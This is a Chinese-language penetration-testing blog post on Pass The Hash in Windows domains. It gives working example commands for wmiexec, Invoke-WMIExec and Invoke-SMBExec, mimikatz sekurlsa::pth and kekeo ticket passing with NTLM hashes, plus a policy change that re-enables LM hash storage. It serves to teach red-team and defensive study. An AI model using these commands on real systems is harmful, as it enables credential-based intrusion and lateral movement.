---
layout: post
title: 域渗透——Pass The Hash的实现
---


## 0x00 前言
---

在之前的文章《域渗透——Pass The Hash & Pass The Key》曾介绍过kb2871997对Pass The Hash的影响。本文将站在另一个角度，介绍Pass The Hash的相关实现

## 0x01 简介
---

本文将要介绍以下内容：

- Pass The Hash的原理
- 常用工具
- mimikatz中的Pass The Hash
- mimikatz中的Pass The Ticket

## 0x02 Pass The Hash的原理
---

可参考Wikipedia的介绍，地址如下：

https://en.wikipedia.org/wiki/Pass_the_hash

提取出关键信息：

- 在Windows系统中，通常会使用NTLM身份认证
- NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)
- hash分为LM hash和NT hash，如果密码长度大于15，那么无法生成LM hash。从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash
- 如果攻击者获得了hash，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)

**注：**

mimikatz支持导出内存中用户的LM hash，但前提是Windows系统支持LM hash

Windows Server 2008启用LM hash的方法：

`gpedit.msc`-`计算机配置`-`Windows 设置`-`安全设置`-`本地策略`-`安全选项`

找到`网络安全︰ 不要在下次更改密码存储 LAN 管理器的哈希值`，选择`已禁用`

系统下一次更改密码后，就能够导出LM hash


## 0x03 常用工具
---

当我们获得某个用户的口令hash，并且条件限定我们不去破解明文口令，实现Pass The Hash都有哪些工具呢？

### 1、Kali下的工具

#### (1) meterpreter

```
use exploit/windows/smb/psexec_psh
```

#### (2) 工具集

位于`密码攻击`-`Passing the Hash`下，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-8/1215.png)

包含多种利用工具

### 2、Windows系统下的工具

#### (1) python

**wmiexec：**

参考地址：

https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py

exe版本下载地址：

https://github.com/maaaaz/impacket-examples-windows

**注：**

wmiexec.py的注释中提示"Main advantage here is it runs under the user (has to be Admin) account"，经实际测试普通用户权限即可 

参数实例：

```
wmiexec -hashes 00000000000000000000000000000000:7ECFFFF0C3548187607A14BAD0F88BB1 TEST/test1@192.168.1.1 "whoami"
```

wmiexec.py的hash参数格式为`LMHASH:NTHASH`，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值

#### (2) powershell

参考地址：

https://github.com/Kevin-Robertson/Invoke-TheHash/

支持多种方式

**Invoke-WMIExec：**

参数实例：

```
Invoke-WMIExec -Target 192.168.1.1 -Domain test.local -Username test1 -Hash 7ECFFFF0C3548187607A14BAD0F88BB1 -Command "calc.exe" -verbose
```

类似wmiexec.py

**Invoke-SMBExec：**

支持SMB1, SMB2 (2.1), and SMB signing

参数实例：

```
Invoke-SMBExec -Target 192.168.0.2 -Domain test.local -Username test1 -Hash 7ECFFFF0C3548187607A14BAD0F88BB1 -Command "calc.exe" -verbose
```

通过在目标主机创建服务执行命令，所以权限为system

**Invoke-SMBClient：**

支持SMB1, SMB2 (2.1), and SMB signing

如果只有SMB文件共享的权限，没有远程执行权限，可以使用该脚本

支持的功能包括列举目录、上传文件、下载文件、删除文件(具体权限取决于该口令hash的权限)


#### (3) mimikatz 

**Pass-The-Hash：**

实际上为Overpass-the-hash

参数实例：

```
privilege::debug
sekurlsa::pth /user:test1 /domain:test.local /ntlm:c5a237b7e9d8e708d8436b6148a25fa1
```

**注：**

mimikatz的pth功能需要本地管理员权限，这是由它的实现机制决定的，需要先获得高权限进程lsass.exe的信息

对于8.1/2012r2，安装补丁kb2871997的Win 7/2008r2/8/2012，可以使用AES keys代替NT hash

**Pass-The-Ticket：**

考虑到mimikatz的pth功能需要本地管理员权限，所以mimikatz也提供了不需要管理员权限的解决方法Pass-The-Ticket

Pass-The-Ticket需要用到gentilkiwi开源的另一款工具kekeo，下载地址：

https://github.com/gentilkiwi/kekeo

参数实例：

```
kekeo "tgt::ask /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1"
```

执行后生成票据`TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi`

接下来导入票据：

```
kekeo "kerberos::ptt TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi"
```


## 0x04 小结
---

本文列举了多种实现Pass The Hash的工具，欢迎补充



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)



